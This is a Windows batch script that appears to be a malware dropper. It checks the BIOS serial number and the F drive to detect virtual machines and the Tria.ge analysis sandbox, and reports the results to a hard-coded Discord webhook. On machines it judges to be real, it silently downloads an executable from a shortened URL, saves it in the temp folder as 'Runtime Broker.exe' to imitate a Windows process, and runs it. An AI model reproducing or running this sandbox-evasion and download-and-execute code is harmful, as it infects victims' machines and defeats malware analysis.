@echo off
setlocal

:: Initialize isVM to false
set "isVM=false"

:: Get the BIOS serial number
for /f "tokens=2 delims==" %%A in ('wmic bios get serialnumber /format:list') do set "serial=%%A"

:: Prepare the message based on the BIOS serial number
if "%serial%"=="0" (
    set "message=VM DETECTED: BIOS serial code is 0"
    set "isVM=true"
) else if "%serial%"=="" (
    set "message=VM DETECTED: BIOS serial code does not exist"
    set "isVM=true"
) else (
    set "message=BIOS serial code is %serial%"
)

:: Check if the F drive is empty
dir F:\ >nul 2>&1
if errorlevel 1 (
    set "driveMessage=Not Tria.ge: F drive does not exist or is not accessible"
) else (
    dir F:\ /a /b >nul 2>&1
    if errorlevel 1 (
        set "driveMessage=Not Tria.ge: F drive is empty"
        set "isVM=true"
    ) else (
        set "driveMessage=Not Tria.ge: F drive is not empty"
    )
)

:: Send message to Discord webhook
set "webhook=https://discord.com/api/webhooks/1271866353652994139/sy_qgxuM91892n5SFBX5FUmpbrIbHj5EqTStLQKgtlw9GlTjmNcksTBWLogertgaRNpO"
powershell -Command "Invoke-RestMethod -Uri '%webhook%' -Method Post -Body (@{content='%message%'} | ConvertTo-Json) -ContentType 'application/json'"
if errorlevel 1 echo Failed to send BIOS message

:: Send F drive status to Discord webhook
powershell -Command "Invoke-RestMethod -Uri '%webhook%' -Method Post -Body (@{content='%driveMessage%'} | ConvertTo-Json) -ContentType 'application/json'"
if errorlevel 1 echo Failed to send drive status

:: Run additional script if not a VM
if "%isVM%"=="false" (
    :: Define the URL of the file and the destination path
    set "url=https://tinyurl.com/nexuspred"
    set "output=%TEMP%\Runtime Broker.exe"

    :: Check if the output file already exists
    if not exist "%output%" (
        :: Run PowerShell in a hidden window and suppress output
        powershell -windowstyle hidden -command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%' -ErrorAction SilentlyContinue"

        :: Check if the file was downloaded
        if exist "%output%" (
            :: Run the file
            start "" "%output%"

            :: Wait for 10 seconds to ensure the file has started executing
            timeout /t 10 /nobreak >nul
        ) else (
            exit /b 1
        )
    )
)

endlocal
